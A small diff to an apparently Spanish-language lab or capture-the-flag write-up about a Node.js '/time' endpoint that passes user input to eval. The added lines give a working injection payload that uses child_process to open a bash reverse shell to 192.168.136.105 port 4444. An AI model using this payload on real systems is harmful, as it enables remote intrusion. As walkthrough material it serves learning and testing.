@@ -722,6 +722,12 @@ app.post('/time', function(request, response) {
 ```
 ![img](./img/Captura1.png)
 
-\n
+
 ![img](./img/Captura2.png)
 
+
+Tenemos eval sin validar la entrada de user, un payload directo seria este:
+
+``` bash 
+require('child_process').execSync('bash -c "bash -i >& /dev/tcp/192.168.136.105/4444 0>&1"')
+```
